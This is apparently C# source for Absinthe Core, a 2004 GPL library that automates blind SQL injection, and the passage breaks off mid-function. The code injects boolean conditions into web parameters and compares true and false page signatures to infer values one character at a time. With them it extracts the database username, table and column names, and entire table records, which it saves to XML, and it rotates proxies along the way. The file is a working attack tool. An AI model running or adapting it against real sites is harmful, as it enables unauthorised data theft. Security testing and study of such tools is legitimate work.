/*****************************************************************************
   Absinthe Core - The Automated Blind SQL Injection Library
   This software is Copyright (C) 2004  nummish, 0x90.org

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
******************************************************************************/

using System;
using System.Data;
using System.Net;
using System.Xml;
using System.Text;
using System.Collections;
using System.Collections.Specialized;
using System.Threading;

namespace Absinthe.Core
{

	// {{{ UnrecognizedPageException Class
	///<summary>This exception is generated when a page can't be cast as true or false</summary>
	public class UnrecognizedPageException : Exception
	{
		private string _Message;
		
		public UnrecognizedPageException(string Message)
		{
			_Message = Message;
		}

		public override string Message
		{
			get 
			{
				return _Message;
			}
		}
	}
	// }}}

	///<summary>
	///The BlindSqlAttackVector class is the object used to perform attacks utilizing Blind SQL Injection
	///</summary>
	public class BlindSqlAttackVector : AttackVector
	{
		private const int TEST_CASE_REDUNDANCY = 4;

		private Queue _Proxies;
		private string _TargetURL;
		private string _VectorName;
		private string _VectorBuffer;
		private string _VectorPostBuffer = "";
		private StringDictionary _AttackParams;
		private bool _ConnectViaPost;
		private double[] TruePageSignature;
		private double[] FalsePageSignature;
		private int[] TrueFilter;
		private int[] FalseFilter;
		private GlobalDS.InjectionOptions _Options;
		private GlobalDS.OutputStatusDelegate _ParentOutput;

		private PluginTemplate _PluginData;

		// {{{ Constructors
		///<summary>
		///Public constructor for instantiation.
		///</summary>
		///<param name="URL">The URL of the target web application, including file path</param>
		///<param name="VectorName">The name of the parameter to use as the injection point</param>
		///<param name="VectorBuffer">The default value to store in the injectable parameter</param>
		///<param name="AdditionalParams">All parameters (names and values) that are used, but not chosen as injection points</param>
		///<param name="Method">The HTTP connection method. This can be "GET" or "POST"</param>
		///<param name="PluginUsed">The Plugin being used for the connection</param>
		///<param name="ParentOutput">Delegate required to pass messages to parent classes</param>
		///<param name="Options">The InjectionOptions to use for all connections</param>
		public BlindSqlAttackVector(string URL, string VectorName, string VectorBuffer, StringDictionary AdditionalParams, string Method, PluginTemplate PluginUsed,
				GlobalDS.OutputStatusDelegate ParentOutput, GlobalDS.InjectionOptions Options)
		{
			_ParentOutput = ParentOutput;
			_Proxies = Options.WebProxies;
			if (PluginUsed == null) _ParentOutput("Null plugin");
			_PluginData = PluginUsed;
			_Options = Options;
			_ParentOutput(String.Format("Delimiter = {0}", _Options.Delimiter));
			Initialize(URL, VectorName, VectorBuffer, AdditionalParams, Method);
		}

		///<summary>
		///Public constructor for instantiation.
		///</summary>
		///<param name="URL">The URL of the target web application, including file path</param>
		///<param name="VectorName">The name of the parameter to use as the injection point</param>
		///<param name="VectorBuffer">The default value to store in the injectable parameter</param>
		///<param name="AdditionalParams">All parameters (names and values) that are used, but not chosen as injection points</param>
		///<param name="Method">The HTTP connection method. This can be "GET" or "POST"</param>
		///<param name="PluginUsed">The Plugin being used for the connection</param>
		///<param name="ParentOutput">Delegate required to pass messages to parent classes</param>
		///<param name="TruePage">The signature for the page representing a "true" value</param>
		///<param name="FalsePage">The signature for the page representing a "false" value</param>
		///<param name="TrueFilterIn">The indices of the signature relevant for comparing an unknown to the true signature</param>
		///<param name="FalseFilterIn">The indices of the signature relevant for comparing an unknown to the false signature</param>
		///<param name="Options">The InjectionOptions to use for all requests</param>
		public BlindSqlAttackVector(string URL, string VectorName, string VectorBuffer, StringDictionary AdditionalParams, string Method, PluginTemplate PluginUsed,
				GlobalDS.OutputStatusDelegate ParentOutput, double[] TruePage, double[] FalsePage, 
				int[] TrueFilterIn, int[] FalseFilterIn, GlobalDS.InjectionOptions Options)
		{
			_ParentOutput = ParentOutput;
			_ConnectViaPost = String.Equals(Method.ToUpper(), "POST");
			_TargetURL = URL;
			_VectorName = VectorName;
			_VectorBuffer = VectorBuffer;
			_Options = Options;
			_PluginData = PluginUsed;
			
			if (_Options.InjectAsString) _VectorBuffer += "'";
			
			_AttackParams = AdditionalParams;
			_ParentOutput = ParentOutput;

			TruePageSignature = TruePage;
			FalsePageSignature = FalsePage;
			TrueFilter = TrueFilterIn;
			FalseFilter = FalseFilterIn;
			
			_VectorPostBuffer = String.Empty;
			if (_Options.TerminateQuery)
			{
				_VectorPostBuffer += "--";
			}
			else if (_Options.AppendedQuery.Length > 0)
			{
				_VectorPostBuffer += _Options.AppendedQuery;
			}
			else if (_Options.InjectAsString)
			{
				_VectorPostBuffer = " AND '1'='1";
			}


			_VectorBuffer += " "; // Required so plugins aren't required to add the spaces
			_Proxies = Options.WebProxies;
		}

		private void Initialize(string URL, string VectorName, string VectorBuffer, StringDictionary AdditionalParams, string Method)
		{
			_ConnectViaPost = String.Equals(Method.ToUpper(), "POST");
			_TargetURL = URL;
			_VectorName = VectorName;
			_VectorBuffer = VectorBuffer;
			if (_Options.InjectAsString) _VectorBuffer += "'";
			_AttackParams = AdditionalParams;

			_VectorPostBuffer = String.Empty;
			if (_Options.TerminateQuery)
			{
				_VectorPostBuffer += "--";
			}
			else if (_Options.AppendedQuery.Length > 0)
			{
				_VectorPostBuffer += _Options.AppendedQuery;
			}
			else if (_Options.InjectAsString)
			{
				_VectorPostBuffer = " AND '1'='1";
			}

			_VectorBuffer += " "; // Required so plugins aren't required to add the spaces
			GenerateTestCases();
		}
		// }}}

		// {{{ RotatedProxy
		// Extract proxy and reinsert it
		private WebProxy RotatedProxy()
		{
			WebProxy retVal = null;
			
			if (_Proxies != null)
			{ 
				retVal = (WebProxy) _Proxies.Dequeue(); 
				_Proxies.Enqueue(retVal); 
			}

			return retVal;
		}
		// }}}

		// {{{ GenerateTestCases
		// Doesn't implement threading yet
		private void GenerateTestCases()
		{
			StringBuilder CurrentVector;
			double[][] TruePages = new double[TEST_CASE_REDUNDANCY][];
			double[][] FalsePages = new double[TEST_CASE_REDUNDANCY][];
			int[][] SubtractiveFilters = new int[TEST_CASE_REDUNDANCY][];
			CurrentVector = new StringBuilder();
			CurrentVector.Append(_VectorBuffer);
			CurrentVector.Append(" AND 1=?").Append(_VectorPostBuffer);
			//int MaxTrueLength = 0, MaxFalseLength = 0;

			_ParentOutput(String.Format("Working with: {0}", _VectorPostBuffer));

			for (int i=0; i < TEST_CASE_REDUNDANCY; i++)
			{
				CurrentVector.Remove(CurrentVector.Length - (8 + _VectorPostBuffer.Length), 8 +  _VectorPostBuffer.Length);
				CurrentVector.Append(" AND ").Append(i).Append("=").Append(i);
				CurrentVector.Append(_VectorPostBuffer);

				_AttackParams[_VectorName] = CurrentVector.ToString();

				string ResultPageTrue, ResultPageFalse;
				WebProxy Proxy = RotatedProxy();

				ResultPageTrue = httpConnect.PageRequest(_TargetURL, _AttackParams, Proxy, _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _ParentOutput);
				if (_Options.Throttle > 0) Thread.Sleep(_Options.Throttle);

				CurrentVector.Remove(CurrentVector.Length - (1 + _VectorPostBuffer.Length), 1 + _VectorPostBuffer.Length);
				CurrentVector.Append(i+1);
				CurrentVector.Append(_VectorPostBuffer);
				_AttackParams[_VectorName] = CurrentVector.ToString();

				Proxy = RotatedProxy();
				ResultPageFalse = httpConnect.PageRequest(_TargetURL, _AttackParams, Proxy, _ConnectViaPost, _Options.Cookies, _Options.AuthCredentials, _ParentOutput);
				if (_Options.Throttle > 0) Thread.Sleep(_Options.Throttle);

				if (ResultPageTrue.Equals(ResultPageFalse))
				{
					throw new UnrecognizedPageException("True and False pages are identical, this will not result in a valid injection. Aborting.");
				}

				TruePages[i] = ParsePage.GetHtmlPageSignature(ResultPageTrue, _Options.Delimiter);
				FalsePages[i] = ParsePage.GetHtmlPageSignature(ResultPageFalse, _Options.Delimiter);
				
				SubtractiveFilters[i] = ParsePage.GenerateSubtractiveFilter(TruePages[i], FalsePages[i], _Options.Tolerance);

			}

			int[] AvgSubFilter = AverageSubtractiveFilters(SubtractiveFilters);

			int[] AdaptiveTrue = ParsePage.GenerateAdaptiveFilter(TruePages, _Options.Tolerance);
			int[] AdaptiveFalse = ParsePage.GenerateAdaptiveFilter(FalsePages, _Options.Tolerance);

			TrueFilter = CombineFilters(AvgSubFilter, AdaptiveTrue);
			FalseFilter = CombineFilters(AvgSubFilter, AdaptiveFalse);

			TruePageSignature = TruePages[0];
			FalsePageSignature = FalsePages[0];

		}
		// }}}

		// {{{ CombineFilters
		private int[] CombineFilters(int[] Filter1, int[] Filter2)
		{
			ArrayList RetVal = new ArrayList();
			int FilterCount = Filter1.Length;

			for(int i=0; i < FilterCount; i++)
			{
				if (Array.IndexOf(Filter2, Filter1[i]) >= 0)
					RetVal.Add(Filter1[i]);
			}

			return (int [])RetVal.ToArray(typeof(int));
		}
		// }}}

		// {{{ AverageSubtractiveFilters
		private int[] AverageSubtractiveFilters(int[][] SubtractiveFilterArray)
		{
			ArrayList RetVal = new ArrayList();
			bool PassRound = false;

			for (int i=0; i < SubtractiveFilterArray[0].Length; i++)
			{
				PassRound = true;
				for (int j=0; j < TEST_CASE_REDUNDANCY; j++)
				{
					PassRound = PassRound && (Array.IndexOf(SubtractiveFilterArray[j],SubtractiveFilterArray[0][i]) >= 0);
				}

				if (PassRound)
				{
					RetVal.Add(SubtractiveFilterArray[0][i]);
				}
			}

			return (int []) RetVal.ToArray(typeof(int));
		}
		// }}}

		// {{{ ExploitType Property
		///<summary>The type of injection (Method and RDBMS)</summary>
		public GlobalDS.ExploitType ExploitType
		{
			get
			{
				return GlobalDS.ExploitType.BlindTSQLInjection;
			}
		}
		// }}}

		// {{{ Proxies Property
		///<summary>The active queue web proxies being used</summary>
		public Queue Proxies
		{
			set
			{
				_Proxies = value;
			}
		}
		// }}}

		// {{{ ToXml 
		///<summary>Writes the internal details of the attack vector to an XML output.</summary>
		///<param name="xOutput">An instantiated XmlTextWriter stream to output to.</param>
		public void ToXml(ref XmlTextWriter xOutput)
		{
			xOutput.WriteStartElement("attackvector");

			xOutput.WriteStartAttribute("name", null);
			xOutput.WriteString(_VectorName);
			xOutput.WriteEndAttribute();

			xOutput.WriteStartAttribute("buffer", null);
			
			// Have to strip out the trailing space
			if (_Options.InjectAsString)
			{
				xOutput.WriteString(_VectorBuffer.Substring(0, _VectorBuffer.Length - 2));
			}
			else
			{
				xOutput.WriteString(_VectorBuffer.Substring(0, _VectorBuffer.Length - 1));
			}
			xOutput.WriteEndAttribute();
//			_ParentOutput(String.Format("I just wrote {0} as the buffer", _VectorBuffer));

			xOutput.WriteStartAttribute("type", null);
			xOutput.WriteString(this.ExploitType.ToString());
			xOutput.WriteEndAttribute();

			/*xOutput.WriteStartAttribute("tolerance", null);
			xOutput.WriteString(_Options.Tolerance.ToString());
			xOutput.WriteEndAttribute();*/
			
			xOutput.WriteStartAttribute("InjectAsString", null);
			xOutput.WriteString(_Options.InjectAsString.ToString());
			xOutput.WriteEndAttribute();
		
			xOutput.WriteStartAttribute("PluginName", null);
			xOutput.WriteString(_PluginData.PluginDisplayTargetName);
			xOutput.WriteEndAttribute();
			
			xOutput.WriteStartAttribute("PostBuffer", null);
			xOutput.WriteString(_Options.AppendedQuery.ToString());
			xOutput.WriteEndAttribute();
		/*	
			xOutput.WriteStartAttribute("Throttle", null);
			xOutput.WriteString(_Options.Throttle.ToString());
			xOutput.WriteEndAttribute();
		*/	
			/*xOutput.WriteStartAttribute("Delimiter", null);
			xOutput.WriteString(_Options.Delimiter.ToString());
			xOutput.WriteEndAttribute(); */
			


			WriteTrueSignature(ref xOutput);
			WriteFalseSignature(ref xOutput);

			WriteTrueFilter(ref xOutput);
			WriteFalseFilter(ref xOutput);

			xOutput.WriteEndElement();
			return;
		}
		// }}}
	
		// {{{ WriteTrueFilter
		private void WriteTrueFilter(ref XmlTextWriter xOutput)
		{
			if (TrueFilter != null)
			{
				xOutput.WriteStartElement("truefilter");
				foreach (int TrueItem in TrueFilter)
				{
					xOutput.WriteStartElement("filter-item");
					xOutput.WriteString(TrueItem.ToString());
					xOutput.WriteEndElement();
				}
				xOutput.WriteEndElement();
			}
		}
		// }}}
	
		// {{{ WriteFalseFilter
		private void WriteFalseFilter(ref XmlTextWriter xOutput)
		{
			if (FalseFilter != null)
			{
				xOutput.WriteStartElement("falsefilter");
				foreach (int FalseItem in FalseFilter)
				{
					xOutput.WriteStartElement("filter-item");
					xOutput.WriteString(FalseItem.ToString());
					xOutput.WriteEndElement();
				}
				xOutput.WriteEndElement();
			}
		}
		// }}}
	
		// {{{ WriteTrueSignature
		private void WriteTrueSignature(ref XmlTextWriter xOutput)
		{
			if (TruePageSignature != null)
			{
				xOutput.WriteStartElement("truepage");
				foreach (double TrueItem in TruePageSignature)
				{
					xOutput.WriteStartElement("signature-item");
					xOutput.WriteString(TrueItem.ToString());
					xOutput.WriteEndElement();
				}
				xOutput.WriteEndElement();
			}
		}
		// }}}

		// {{{ WriteFalseSignature
		private void WriteFalseSignature(ref XmlTextWriter xOutput)
		{
			if (FalsePageSignature != null)
			{
				xOutput.WriteStartElement("falsepage");
				foreach (double FalseItem in FalsePageSignature)
				{
					xOutput.WriteStartElement("signature-item");
					xOutput.WriteString(FalseItem.ToString());
					xOutput.WriteEndElement();
				}
				xOutput.WriteEndElement();
			}
		}
		// }}}

		// {{{ GetDatabaseUsername
		///<summary>Queries the remote database for the username making the connections.</summary>
		///<returns>The current database user the web application is connecting as.</returns>
		public string GetDatabaseUsername()
		{
			StringBuilder CurrentVector = new StringBuilder();
			string retVal = null;

			_ParentOutput("Plugged in with: " + _PluginData.PluginDisplayTargetName);
			_ParentOutput("I know the buffer is supposed to be [" + _VectorBuffer + "]");

			CurrentVector.Append(_VectorBuffer);
			_ParentOutput(_PluginData.SelectDatabaseUsernameLength());
			CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.SelectDatabaseUsernameLength()));


			// TODO: Catch bunk page exception
			long Size = RecursiveSearch(1,0,CurrentVector.ToString());

			_ParentOutput(String.Format("Decided the username size was: {0}", Size));

			lock(this)
			{
				StringBuilder uname = new StringBuilder();
				UnsafeCharArray = new char[(int) Size];
				CharsLeft = Size;
				WaitCallback myCallback = new WaitCallback (ThreadedRecursiveCharacterSearch); 	

				for (long AscCounter = 1; AscCounter <= Size; AscCounter++)
				{
					CurrentVector = new StringBuilder();
					CurrentVector.Append(_VectorBuffer);
					CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.SelectCharacterFromDatabaseUsername(AscCounter)));

					if (_Options.Throttle >= 0)
					{
						long CharVal = RecursiveSearch(1,128,CurrentVector.ToString());

						uname.Append(Convert.ToChar(CharVal));
						_ParentOutput(System.String.Format("Currently, the username is: {0}", uname.ToString()));
					}
					else
					{
						_ParentOutput("Threaded!");
						ThreadedText ttx = new ThreadedText((int)AscCounter - 1, CurrentVector.ToString());
						ThreadPool.QueueUserWorkItem (myCallback, ttx); 
					}
				}	

				if (_Options.Throttle >= 0)
				{
					return uname.ToString();
				}
				else
				{ 
					while(CharsLeft > 0) 
					{
						_ParentOutput(String.Format("3Oh no! {0} Chars Left in {1}", CharsLeft, new String(UnsafeCharArray)));
						Thread.Sleep(10); 
					}
				}
			
				retVal = new String(UnsafeCharArray);
			}
			return retVal;
		}
		// }}}

		char[] UnsafeCharArray; // this needs to be locked
		long CharsLeft;

		private void ThreadedRecursiveCharacterSearch(Object o)
		{
			ThreadedText ttx = (ThreadedText) o;
			long CharVal = RecursiveSearch(1,128,ttx.SearchString);
			//ttx.SetValue(Convert.ToChar(CharVal));
			lock(_PluginData)
			{
				UnsafeCharArray[ttx.Index] = Convert.ToChar(CharVal);
				CharsLeft--;
			}
		}

		private class ThreadedText
		{
			private int _Index;
			private string _SearchString;

			public ThreadedText(int Index, string SearchString)
			{
				_Index = Index;
				_SearchString = SearchString;
			}

			public string SearchString
			{
				get
				{
					return _SearchString;
				}
			}

			public int Index
			{
				get
				{
					return _Index;
				}
			}
		}

		// {{{ PopulateTableStructure
		///<summary>Retrieve the information about the fields for a given table from the database schema.</summary>
		///<param name="TableData">The table to load field info for.</param>
		public void PopulateTableStructure(ref GlobalDS.Table TableData)
		{
			long[] FieldIDs;
			long PrimaryKey;
			int FieldCount;

			FieldIDs = GetFieldIDs(TableData.ObjectID);

			FieldCount = FieldIDs.Length;

			PrimaryKey = RetrievePrimaryKey(TableData.ObjectID);	

			for (int i=0; i < FieldCount; i++)
			{
				TableData.AddField(RetrieveField(FieldIDs[i], TableData.ObjectID, PrimaryKey));
			}
		}
		// }}}

		// {{{ GetFieldIDs
		private long[] GetFieldIDs(long TableID)
		{
			ArrayList RetVal = new ArrayList();

			long FieldCount = GetNumberOfFieldsInTable(TableID);		
			StringBuilder CurrentVector = new StringBuilder();

			long ThisID = 0;

			for (int i = 0; i < FieldCount; i++)
			{
				CurrentVector = new StringBuilder();
				CurrentVector.Append(_VectorBuffer);
				CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.NextLowestFieldID(TableID, ThisID)));

				ThisID  = RecursiveSearch(1,0,CurrentVector.ToString());

				RetVal.Add(ThisID);
			}

			return (long[]) RetVal.ToArray(typeof(long));
		}
		// }}}

		// {{{ BuildTableList
		///<summary>Retrieve the information about the structure of all tables from the database schema.</summary>
		///<returns>An array containing the data for all tables in the database</returns>
		public GlobalDS.Table[] GetTableList()
		{
			long[] TableIDs;
			int TableCount;
			ArrayList retVal = new ArrayList();

			TableIDs = GetTableIDs();

			TableCount = TableIDs.Length;

			for (int i=0; i < TableCount; i++)
			{
				retVal.Add(RetrieveTable(TableIDs[i]));
			}

			return (GlobalDS.Table[]) retVal.ToArray(typeof(GlobalDS.Table));
		}
		// }}}

		// {{{ GetTableIDs
		private long[] GetTableIDs()
		{
			ArrayList retVal = new ArrayList();

			long TableCount = GetNumberOfTablesInDatabase();		
			StringBuilder CurrentVector = new StringBuilder();

			long ThisID = 0;

			for (int i = 0; i < TableCount; i++)
			{
				CurrentVector = new StringBuilder();
				CurrentVector.Append(_VectorBuffer);
				CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.NextLowestTableID(ThisID)));

				ThisID  = RecursiveSearch(1,0,CurrentVector.ToString());

				retVal.Add(ThisID);
			}

			return (long[]) retVal.ToArray(typeof(long));

		}
		// }}}

		// {{{ RetrieveTable
		private GlobalDS.Table RetrieveTable(long TableID)
		{
			GlobalDS.Table RetVal = new GlobalDS.Table();
			StringBuilder NameBuilder = new StringBuilder();

			StringBuilder CurrentVector = new StringBuilder();
			CurrentVector.Append(_VectorBuffer);
			CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.TableNameLength(TableID)));

			long Size = RecursiveSearch(1,0,CurrentVector.ToString());

			lock(this)
			{

				UnsafeCharArray = new char[Size];
				CharsLeft = Size;
				_ParentOutput(String.Format("4Oh no! {0} Chars Left in {1}", CharsLeft, new String(UnsafeCharArray)));
				Thread.Sleep(1000); 
				WaitCallback myCallback = new WaitCallback (ThreadedRecursiveCharacterSearch); 	

				for (long AscCounter = 1; AscCounter <= Size; AscCounter++)
				{
					CurrentVector = new StringBuilder();
					CurrentVector.Append(_VectorBuffer);
					CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.TableNameCharacterValue(AscCounter, TableID)));
					if (_Options.Throttle >= 0)
					{
						_ParentOutput(String.Format("5Oh no! {0} Chars Left in {1}", CharsLeft, new String(UnsafeCharArray)));
						Thread.Sleep(1000); 
						NameBuilder.Append(Convert.ToChar(RecursiveSearch(1, 128, CurrentVector.ToString())));
					}
					else
					{
						ThreadedText ttx = new ThreadedText((int)AscCounter - 1, CurrentVector.ToString());
						ThreadPool.QueueUserWorkItem (myCallback, ttx); 
					}
				}	


				CurrentVector = new StringBuilder();
				CurrentVector.Append(_VectorBuffer);
				CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.NumberOfRecords(NameBuilder.ToString())));

				long TableRecordCount = RecursiveSearch(1,0, CurrentVector.ToString());


				RetVal.ObjectID = TableID;
				RetVal.RecordCount = TableRecordCount;

				//			RetrievePrimaryKey(TableID);
				string TableName;

				if (_Options.Throttle >= 0)
				{
					TableName = NameBuilder.ToString();
				}
				else
				{
					while(CharsLeft > 0) 
					{
						_ParentOutput(String.Format("2Oh no! {0} Chars Left in {1}", CharsLeft, new String(UnsafeCharArray)));
						Thread.Sleep(1000); 
					}
					TableName = new String(UnsafeCharArray);
				}

				RetVal.Name = TableName;

			}

			return RetVal;
		}
		// }}}

		// {{{ RetrievePrimaryKey
		private long RetrievePrimaryKey(long TableID)
		{
			StringBuilder CurrentVector = new StringBuilder();
			CurrentVector.Append(_VectorBuffer);
			CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.PrimaryKeyColumn(TableID)));

			long retVal = RecursiveSearch(1,0,CurrentVector.ToString());
			return retVal;
		}
		// }}}

		// {{{ RetrieveField
		private GlobalDS.Field RetrieveField(long FieldID, long TableID, long PrimaryKey)
		{
			GlobalDS.Field RetVal = new GlobalDS.Field();

			RetVal.FieldName = GetFieldName(FieldID, TableID);
			RetVal.DataType = GetFieldDataType(FieldID, TableID);
			RetVal.IsPrimary = (PrimaryKey == FieldID);

			return RetVal;
		}
		// }}}

		// {{{ GetFieldDataType
		private System.Data.SqlDbType GetFieldDataType(long FieldID, long TableID)
		{
			StringBuilder CurrentVector = new StringBuilder();
			CurrentVector.Append(_VectorBuffer);
			CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.FieldDataType(FieldID, TableID)));

			long DataTypeID = RecursiveSearch(1,0,CurrentVector.ToString());

			return _PluginData.ConvertNativeDataType(DataTypeID);

		}
		// }}}

		// {{{ GetFieldName
		private string GetFieldName(long FieldID, long TableID)
		{
			StringBuilder NameBuilder = new StringBuilder();
			StringBuilder CurrentVector = new StringBuilder();
			CurrentVector.Append(_VectorBuffer);
			CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.FieldNameLength(FieldID, TableID)));

			long Size = RecursiveSearch(1,0,CurrentVector.ToString());

			for (long AscCounter = 1; AscCounter <= Size; AscCounter++)
			{
				CurrentVector = new StringBuilder();
				CurrentVector.Append(_VectorBuffer);
				CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.FieldNameCharacterValue(AscCounter, FieldID, TableID)));
				NameBuilder.Append(Convert.ToChar( RecursiveSearch( 1,128, CurrentVector.ToString() )));
			}	

			return NameBuilder.ToString();	
		}
		// }}}

		// {{{ GetNumberOfTablesInDatabase
		///<summary>Extracts the number of tables in the database schema</summary>
		///<returns>The number of tables in the database.</returns>
		public long GetNumberOfTablesInDatabase()
		{
			StringBuilder CurrentVector = new StringBuilder();
			CurrentVector.Append(_VectorBuffer);
			CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.NumberOfTables()));
			//CurrentVector.Append(" AND (select COUNT(name) from sysobjects where xtype=char(85)) > ");

			long TableCount = RecursiveSearch(1,0,CurrentVector.ToString());

			//_ParentOutput("There are {0} tables in the database", TableCount);

			return TableCount;
		}
		// }}}

		// {{{ GetNumberOfFieldsInTable
		///<summary>Extracts the number of fields in a table from the database schema</summary>
		///<param name="TableID">The ID of the table to check for fields</param>
		///<returns>The number of fields in the table</returns>
		public long GetNumberOfFieldsInTable(long TableID)
		{
			StringBuilder CurrentVector = new StringBuilder();
			CurrentVector.Append(_VectorBuffer);
			CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.NumberOfFieldsInTable(TableID)));

			long FieldCount = RecursiveSearch(1,0,CurrentVector.ToString());

			return FieldCount;
		}
		// }}}

		// {{{ PullDataFromTable
		///<summary>Downloads the contents of the given fields and tables from the database to an XML file.</summary>
		///<param name="SrcTable">An array of the tables to pull data from.</param>
		///<param name="ColumnIDLists">An array of the column lists to be pulled from the database.
		///The indices from this array should match up with the indices of SrcTable</param>
		///<param name="xmlFilename">The filename to write the downloaded xml data to</param>
		public void PullDataFromTable(GlobalDS.Table[] SrcTable, long[][] ColumnIDLists, string xmlFilename)
		{
			int TableCount;
			if (xmlFilename.Length == 0) throw new System.Exception(" No File Defined fucker ");

			XmlTextWriter xOutput = new XmlTextWriter(xmlFilename, System.Text.Encoding.UTF8);
			xOutput.Formatting = Formatting.Indented;
			xOutput.Indentation = 4;
			xOutput.WriteStartDocument();

			xOutput.WriteStartElement("AbsinthedatabasePull");
			xOutput.WriteStartAttribute("version", null);
			xOutput.WriteString("1.0");
			xOutput.WriteEndAttribute();

			try
			{
				for (TableCount = 0; TableCount < SrcTable.Length; TableCount++)
				{
					PullDataFromIndividualTable(SrcTable[TableCount], ColumnIDLists[TableCount], ref xOutput);
				}
			}
			catch (Exception e)
			{
				_ParentOutput(e.ToString());
			}
			finally
			{
				xOutput.WriteEndElement();
				xOutput.WriteEndDocument();
				xOutput.Close();
			}

		}
		// }}}

		// {{{ PullDataFromIndividualTable
		private ArrayList PullDataFromIndividualTable(GlobalDS.Table SrcTable, long[] ColumnIDs, ref XmlTextWriter xOutput)
		{
			ArrayList retVal = new ArrayList();
			long RecordCounter = 0;
			GlobalDS.Field[] ColumnList = new GlobalDS.Field[ColumnIDs.Length];
			GlobalDS.PrimaryKey CurrentPrimaryKey = new GlobalDS.PrimaryKey();
			int ColumnCounter = 0;
			string PrimaryKeyName = String.Empty;
			SqlDbType PrimaryKeyType= SqlDbType.Int;

			_ParentOutput(String.Format("Individual Pulling {0}", SrcTable.Name));

			// Generate Field List
			for (long FieldCounter = 0; FieldCounter < SrcTable.FieldList.Length; FieldCounter++)
			{
				_ParentOutput(String.Format("Going for Field: {0}", SrcTable.FieldList[FieldCounter].FieldName));

				if (Array.IndexOf(ColumnIDs, FieldCounter+1) >= 0)
				{
					ColumnList[ColumnCounter] = SrcTable.FieldList[FieldCounter];
					ColumnCounter++;
				}

				if (SrcTable.FieldList[FieldCounter].IsPrimary)
				{
					PrimaryKeyName = SrcTable.FieldList[FieldCounter].FieldName;
					PrimaryKeyType = SrcTable.FieldList[FieldCounter].DataType;
				}
			}

			if (PrimaryKeyName.Length > 0)
			{
				for (RecordCounter = 0; RecordCounter < SrcTable.RecordCount; RecordCounter++)
				{
					CurrentPrimaryKey = IteratePrimaryKey(SrcTable.Name, PrimaryKeyName, CurrentPrimaryKey, PrimaryKeyType);
					Hashtable Record = GetRecord(SrcTable.Name, ColumnList, CurrentPrimaryKey);
					retVal.Add(Record);
					OutputRecordToFile(ref xOutput, Record, CurrentPrimaryKey);
				}
			}

			return retVal;
		}
		// }}}

		// {{{ OutputRecordToFile
		private void OutputRecordToFile(ref XmlTextWriter xOutput, Hashtable DataRecord, GlobalDS.PrimaryKey pk)
		{
			xOutput.WriteStartElement("DataRecord");
			xOutput.WriteStartAttribute("PrimaryKey", null);
			xOutput.WriteString(pk.Name);
			xOutput.WriteEndAttribute();
			xOutput.WriteStartAttribute("PrimaryKeyValue", null);
			xOutput.WriteString(pk.OutputValue);
			xOutput.WriteEndAttribute();

			foreach(string Key in DataRecord.Keys)
			{
				xOutput.WriteStartElement(Key);
				xOutput.WriteString(DataRecord[Key].ToString());	
				xOutput.WriteEndElement();
			}

			xOutput.WriteEndElement();
		}
		// }}}

		// {{{ IteratePrimaryKey
		private GlobalDS.PrimaryKey IteratePrimaryKey(string TableName, string KeyName, GlobalDS.PrimaryKey CurrentPrimaryKey, SqlDbType PrimaryKeyType)
		{
			switch(PrimaryKeyType)
			{
				case SqlDbType.BigInt:
					goto case SqlDbType.Int;
				case SqlDbType.SmallInt:
					goto case SqlDbType.Int;
				case SqlDbType.TinyInt:
					goto case SqlDbType.Int;
				case SqlDbType.Int:
					return IterateIntegerPrimaryKey(TableName, KeyName, CurrentPrimaryKey);
				default:
					return IterateNonIntegerPrimaryKey(TableName, KeyName, CurrentPrimaryKey);
			}
		}
		// }}}

		// {{{ IterateNonIntegerPrimaryKey
		private GlobalDS.PrimaryKey IterateNonIntegerPrimaryKey(string TableName, string KeyName, GlobalDS.PrimaryKey CurrentPrimaryKey)
		{
			StringBuilder CurrentVector = new StringBuilder();
			CurrentVector.Append(_VectorBuffer);

			if (CurrentPrimaryKey.Name == KeyName)
			{
				CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.LengthOfConvertedPrimaryKeyValue(KeyName, TableName, CurrentPrimaryKey.Value)));
			}
			else
			{
				CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.LengthOfConvertedPrimaryKeyValue(KeyName, TableName)));
			}

			long Size = RecursiveSearch(1,0,CurrentVector.ToString());

			StringBuilder KeyValueBuilder = new StringBuilder();
			StringBuilder KeyOutputValueBuilder = new StringBuilder();
			for (long AscCounter = 1; AscCounter <= Size; AscCounter++)
			{
				CurrentVector = new StringBuilder();
				CurrentVector.Append(_VectorBuffer);

				if (CurrentPrimaryKey.Name == KeyName)
				{
					CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.ConvertedPrimaryKeyValueCharacter(AscCounter, KeyName, TableName, CurrentPrimaryKey.Value)));
				}
				else
				{
					CurrentVector.Append(_PluginData.AndGreaterThanWrapper(_PluginData.ConvertedPrimaryKeyValueCharacter(AscCounter, KeyName, TableName)));
				}

				long SearchVal = RecursiveSearch( 1,128, CurrentVector.ToString());
				KeyValueBuilder.Append(_PluginData.CharConversionFunction(SearchVal)).Append(_PluginData.ConcatenationCharacter);
				KeyOutputValueBuilder.Append(Convert.ToChar(SearchVal));
			}	

			KeyValueBuilder.Remove(KeyValueBuilder.Length - 1, 1);

			GlobalDS.PrimaryKey retVal = new GlobalDS.PrimaryKey();
